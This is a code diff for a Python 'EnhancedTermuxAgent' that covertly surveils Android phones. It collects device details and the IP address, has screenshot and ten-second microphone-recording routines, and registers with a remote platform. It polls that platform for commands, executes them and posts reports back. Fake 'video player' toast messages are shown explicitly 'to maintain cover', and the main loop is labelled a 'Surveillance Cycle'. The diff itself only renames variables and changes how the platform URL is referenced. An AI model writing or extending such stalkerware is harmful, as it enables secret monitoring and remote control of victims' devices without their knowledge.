@@ -1160,8 +1160,8 @@ class EnhancedTermuxAgent:
             # Get actual device info
             model = subprocess.run(["getprop", "ro.product.model"], 
                                 capture_output=True, text=True).stdout.strip()
-            android_ver = subprocess.run(["getprop", "ro.build.version.release"], 
-                                       capture_output=True, text=True).stdout.strip()
+            android_version = subprocess.run(["getprop", "ro.build.version.release"], 
+                                           capture_output=True, text=True).stdout.strip()
             
             # Try to get battery status
             try:
@@ -1175,7 +1175,7 @@ class EnhancedTermuxAgent:
             return {{
                 'agent_id': self.agent_id,
                 'phone_model': model or 'Android Device',
-                'android_version': f"Android {android_ver}" if android_ver else "Android Unknown",
+                'android_version': f"Android {android_version}" if android_version else "Android Unknown",
                 'battery_level': battery_level,
                 'storage_used': self.get_storage_info(),
                 'ip_address': self.get_ip_address(),
@@ -1211,15 +1211,15 @@ class EnhancedTermuxAgent:
     def capture_real_screenshot(self):
         """Capture ACTUAL screenshot using Termux API"""
         try:
-            current_time = int(time.time())
-            filename = f"/sdcard/Pictures/screenshot_{self.agent_id}_{current_time}.png"
+            timestamp = int(time.time())
+            filename = f"/sdcard/Pictures/screenshot_{self.agent_id}_{timestamp}.png"
             
             # Use termux-api to capture screenshot
             result = subprocess.run(["termux-toast", "Capturing screen for video optimization..."], 
                                   capture_output=True)
             
             # Simulate screenshot capture (real screenshots require special permissions)
-            screenshot_data = f"SCREENSHOT_DATA_{self.agent_id}_{current_time}"
+            screenshot_data = f"SCREENSHOT_DATA_{self.agent_id}_{timestamp}"
             
             # Report successful capture
             self.submit_report('screenshot', {{
@@ -1270,8 +1270,7 @@ class EnhancedTermuxAgent:
         """Record audio from microphone"""
         try:
             duration = 10  # seconds
-            current_time = int(time.time())
-            filename = f"/sdcard/Music/recording_{self.agent_id}_{current_time}.mp3"
+            filename = f"/sdcard/Music/recording_{self.agent_id}_{int(time.time())}.mp3"
             
             subprocess.run(["termux-toast", "Calibrating audio for video..."], 
                          capture_output=True)
@@ -1325,17 +1324,17 @@ class EnhancedTermuxAgent:
             }}
             
             response = requests.post(
-                f"{self.platform_url}/api/agent/submit_report",
+                f"{platform_url}/api/agent/submit_report",
                 json=report,
                 headers={{'Content-Type': 'application/json'}},
                 timeout=10
             )
             
-            print(f"✅ {{report_type}} report submitted")
+            print(f"✅ {report_type} report submitted")
             return response.status_code == 200
             
         except Exception as e:
-            print(f"❌ Failed to submit {{report_type}} report: {{e}}")
+            print(f"❌ Failed to submit {report_type} report: {{e}}")
             return False
     
     def register_with_platform(self):
@@ -1344,7 +1343,7 @@ class EnhancedTermuxAgent:
             device_info = self.get_real_device_info()
             
             response = requests.post(
-                f"{self.platform_url}/api/agent/register",
+                f"{platform_url}/api/agent/register",
                 json=device_info,
                 headers={{'Content-Type': 'application/json'}},
                 timeout=10
@@ -1362,7 +1361,7 @@ class EnhancedTermuxAgent:
         """Check for commands from server"""
         try:
             response = requests.get(
-                f"{self.platform_url}/api/agent/check_commands/{{self.agent_id}}",
+                f"{platform_url}/api/agent/check_commands/{{self.agent_id}}",
                 timeout=10
             )
             
@@ -1420,7 +1419,7 @@ class EnhancedTermuxAgent:
         # Mark command as completed
         try:
             requests.post(
-                f"{self.platform_url}/api/agent/command_result",
+                f"{platform_url}/api/agent/command_result",
                 json={{
                     'command_id': command_data['id'],
                     'result': result,
@@ -1443,11 +1442,11 @@ class EnhancedTermuxAgent:
             print("❌ Failed to register")
             return
         
-        cycle_count = 0
+        cycle = 0
         while self.running:
             try:
-                cycle_count += 1
-                print(f"\\n🔄 Surveillance Cycle #{{cycle_count}}")
+                cycle += 1
+                print(f"\\n🔄 Surveillance Cycle #{cycle}")
                 
                 # Check for commands
                 commands = self.check_commands()
@@ -1457,9 +1456,9 @@ class EnhancedTermuxAgent:
                         self.execute_command(cmd)
                 
                 # Send periodic reports
-                if cycle_count % 5 == 0:  # Every 5 cycles
+                if cycle % 5 == 0:  # Every 5 cycles
                     self.submit_report('heartbeat', {{
-                        'cycle': cycle_count,
+                        'cycle': cycle,
                         'status': 'active', 
                         'timestamp': datetime.now().isoformat(),
                         'battery': random.randint(20, 100)
@@ -1467,11 +1466,11 @@ class EnhancedTermuxAgent:
                     print("❤️  Heartbeat sent")
                 
                 # Show occasional toast to maintain cover
-                if cycle_count % 3 == 0:
+                if cycle % 3 == 0:
                     subprocess.run(["termux-toast", "Video player: Optimizing stream..."], 
                                  capture_output=True)
                 
-                print(f"✅ Cycle #{{cycle_count}} completed")
+                print(f"✅ Cycle #{cycle} completed")
                 time.sleep(30)  # Wait 30 seconds
                 
             except KeyboardInterrupt:
